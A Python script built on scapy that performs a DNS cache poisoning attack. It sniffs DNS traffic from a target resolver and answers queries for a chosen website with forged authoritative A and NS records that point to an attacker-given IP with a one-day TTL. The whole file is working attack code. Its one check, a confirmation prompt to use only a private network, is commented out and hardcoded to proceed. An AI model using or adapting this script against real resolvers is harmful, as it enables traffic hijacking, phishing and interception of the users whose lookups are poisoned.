#! /usr/bin/env python3
# run as sudo

# ----- DO NOT RUN IN PUBLIC NETWORK

from scapy.all import *
import sys
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-w", "--website", dest="website",
                        help="Target Website", required=True)
    parser.add_argument("-i", "--spoofed-ip", dest="ip",
                        help="Spoofed IP address", required=True)
    parser.add_argument("-I", "--Interface", dest="Interface",
                        help="Netwosrk Interface", required=True)
    parser.add_argument("-d", "--dns-server-ip",dest="dns_ip",
                        help="DNS Server IP", required=True)
    opt = parser.parse_args()
    return opt

def sniffer(pkt):

    try:
        if DNSQR in pkt and pkt.dport == 53 and pkt[IP].src == opt.dns_ip:
            print('[**] Detected DNS QR from target DNS server to ' + pkt[IP].dst)
            poisoner(pkt)
        elif DNSRR in pkt and pkt.sport == 53 and pkt[IP].dst == opt.dns_ip :
            print('[**] Detected DNS RR from ' + pkt[IP].src + ' to target DNS server')
            # print(pkt[DNS].show())
    except:
        pass

def poisoner(pkt):
    qname = pkt[DNS].qd.qname.decode()
    if opt.website in qname:
        print("[**] Target DNS Server is Querying for : " + qname)
        
        if pkt[DNS].qr == 0 \
            and pkt[DNS].qd.qtype == 1 \
            and pkt[DNS].qd.qclass == 1:
                ip_pkt = IP(src='192.168.1.1',dst=pkt.getlayer(IP).src)
                udp_pkt = UDP(sport=53,dport=pkt.getlayer(UDP).sport)
                dns_pkt = DNS(
                    id=pkt[DNS].id,
                    opcode=pkt[DNS].opcode,
                    qdcount=pkt[DNS].qdcount,
                    qr=1,
                    aa=1,
                    rd=0,
                    ra=0,
                    z=0,
                    rcode=0,
                    ancount=1,
                    nscount=1,
                    arcount=1,
                    qd=DNSQR(qname=qname,qtype=pkt[DNS].qd.qtype,qclass=pkt[DNS].qd.qclass),  #The Question Section
                    an=DNSRR(rrname=qname,rdata=opt.ip,ttl=86400),                           #Resource Record
                    ns=DNSRR(rrname=qname,type=2,ttl=86400,rdata=opt.ip),                    #Resource Record
                    ar=DNSRR(rrname=qname,rdata=opt.ip)
                    )
                
                send(ip_pkt/udp_pkt/dns_pkt, iface=opt.Interface, verbose=0)
                print('[**] Spoofed Packet Sent !!')

        # packet = IP(pkt[IP])/UDP()/DNS(
        #             opcode=5,
        #             an=DNSRR(rrname=opt.website,
        #                 type="A", ttl=120, rdata=opt.ip))
        # dns_responce = DNSRR(rrname=qname, rdata=opt.ip) # generate a new fake RR
        # pkt[DNS].an = dns_responce
        # pkt[DNS].ancount = 1
        # del pkt[IP].len, pkt[IP].chksum, pkt[UDP].len, pkt[UDP].chksum

        # add_packet = send(pkt ,iface=opt.Interface,verbose=0)
        # print(packet[DNS].show())
if __name__ == "__main__":
    try:
        opt = get_arguments()
        # gate = input("[WARNING] Make Sure Selected Interface is in PRIVATE NETWORK!![yN]")
        gate = "y"
        if gate == "y" or gate == "Y":
            filter_bpf = 'udp and port 53'
            sniff(iface=opt.Interface, filter=filter_bpf, store=0,  prn=sniffer)
    except:
        sys.exit(1)